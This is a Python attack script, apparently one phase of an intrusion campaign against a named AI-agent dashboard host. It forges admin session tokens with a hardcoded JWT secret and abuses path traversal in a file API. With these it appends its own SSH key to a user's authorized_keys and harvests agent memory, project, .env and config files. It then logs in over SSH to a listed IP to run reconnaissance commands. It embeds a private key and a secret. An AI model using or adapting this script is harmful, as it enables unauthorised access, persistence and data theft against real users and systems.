#!/usr/bin/env python3
# i29311 phase6: plant own key in Brian's /home/coder/.ssh/authorized_keys (append-safe) + SSH + harvest lists
import os, sys, json, base64, hmac, hashlib, subprocess, random
import urllib.parse as up
HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
PRIVKEY = '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtz\nc2gtZWQyNTUxOQAAACCAnkDKuU/yBPwz0b2JhsMwWBnjQ3JaskSz68oBl1p/4wAA\nAIjSameI0mpniAAAAAtzc2gtZWQyNTUxOQAAACCAnkDKuU/yBPwz0b2JhsMwWBnj\nQ3JaskSz68oBl1p/4wAAAEAkBW7ywVFTAY1hPsw814sO5ausr4Y2si7Y0c0kbZtD\nx4CeQMq5T/IE/DPRvYmGwzBYGeNDclqyRLPrygGXWn/jAAAAAAECAwQF\n-----END OPENSSH PRIVATE KEY-----\n'
PUBKEY = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIICeQMq5T/IE/DPRvYmGwzBYGeNDclqyRLPrygGXWn/j'
def _b64(s): return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    print("R:%s:%s" % (k, _b64(s)), flush=True)
def sh(a, timeout=90):
    try:
        r = subprocess.run(a, capture_output=True, timeout=timeout); return r.returncode, r.stdout.decode("utf-8","replace"), r.stderr.decode("utf-8","replace")
    except Exception as e: return -1, "", repr(e)
def curl(args, timeout=40): return sh(["curl","-s","-k","-m",str(timeout)]+args, timeout=timeout+15)
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def forge(p):
    h=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":"))); pl=b64u(json.dumps(p,separators=(",",":")))
    return h+"."+pl+"."+b64u(hmac.new(JWT_SECRET.encode(),(h+"."+pl).encode(),hashlib.sha256).digest())
def tok_for(uid,cust): return forge({"userId":uid,"email":"probe@x","customer":cust,"role":"admin"})
def call(path,cookie,timeout=30,maxlen=200000):
    a=["--http2","-A",UA,"-H","Accept: application/json","-H","Cookie: session="+cookie,"-w","\n__CODE__%{http_code}","https://%s%s"%(HOST,path)]
    rc,out,err=curl(a,timeout=timeout); i=out.rfind("__CODE__"); code=""; txt=out
    if i>=0: code=out[i+8:].strip()[:3]; txt=out[:i]
    return {"code":code,"body":txt[:maxlen]}
K="/home/lumii/.lumii-agent-keeper/.."
def rd(aid,rel,tok,maxlen=20000): return call("/api/agents/%s/files?action=read&path=%s"%(aid,up.quote(K+rel,safe="/")),tok,maxlen=maxlen)
def ls(aid,rel,tok,maxlen=10000): return call("/api/agents/%s/files?action=list&path=%s"%(aid,up.quote(K+rel,safe="/")),tok,maxlen=maxlen)
def upload(aid,tok,path,name,content,timeout=60):
    tmp="/tmp/u_%d"%random.randint(1000,999999); open(tmp,"wb").write(content.encode() if isinstance(content,str) else content)
    url="https://%s/api/agents/%s/files/upload?path=%s"%(HOST,aid,up.quote(path,safe="/"))
    rc,out,err=curl(["--http2","-A",UA,"-H","Cookie: session="+tok,"-w","\n__CODE__%{http_code}","-F","files=@%s;filename=%s"%(tmp,name),url],timeout=timeout)
    i=out.rfind("__CODE__"); code=""; txt=out
    if i>=0: code=out[i+8:].strip()[:3]; txt=out[:i]
    return {"code":code,"body":txt[:400]}
AID="agent-047f1d22"; CUST="aro"; AUID="fc7c3730-4219-11f1-ac43-525400595be1"
def jbody(r):
    try: return json.loads(json.loads(r['body'])['body'] if 'body' in r else r['body'])
    except Exception: return None
def main():
    TOK = tok_for(AUID, CUST)
    # read current authorized_keys to append safely
    ak_r = files_read = rd(AID,"/.ssh/authorized_keys",TOK,maxlen=20000)
    try: ak=json.loads(json.loads(ak_r['body']))['content']
    except Exception:
        R("AK_READ_FAIL", json.dumps(ak_r)[:400]); ak=None
    if ak is not None:
        R("ak_len", str(len(ak)))
        newak = ak if ak.endswith("\n") else ak+"\n"
        newak = newak + PUBKEY + " i29311@probe\n"
        R("up_key", upload(AID,TOK,"/home/lumii/.lumii-agent-keeper/../.ssh","authorized_keys",newak))
        R("verify_ak", rd(AID,"/.ssh/authorized_keys",TOK,maxlen=6000))
    # harvest lists
    for d in ["/.claude/projects","/.claude/memory","/.claude/file-history","/.gstack/sessions","/.gstack/projects","/.lumii/agents","/.lumii/agents/agent-047f1d22","/lumii-assistant/.env.dev","/.claude.json"]:
        R("LS"+d.replace("/","_")[:45], ls(AID,d,TOK,maxlen=8000) if 'json' not in d[-4:] else rd(AID,d,TOK,maxlen=8000))
    # SSH with planted key
    open("/tmp/ik","w").write(PRIVKEY); os.chmod("/tmp/ik",0o600)
    for host in ["101.32.60.77"]:
        rc,out,err=sh(["bash","-lc","timeout 25 ssh -i /tmp/ik -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=12 -o PreferredAuthentications=publickey coder@%s 'id; hostname; sudo -n id 2>&1|head -2; ls -la /opt 2>&1|head; cat /etc/hostname' 2>&1"%host],timeout=45)
        R("SSH2_"+host, "rc=%d\nOUT=%s\nERR=%s"%(rc,out[:2000],err[:600]))
try: main()
except Exception:
    import traceback; R("FATAL", traceback.format_exc()[-3000:])
finally: sys.exit(0)
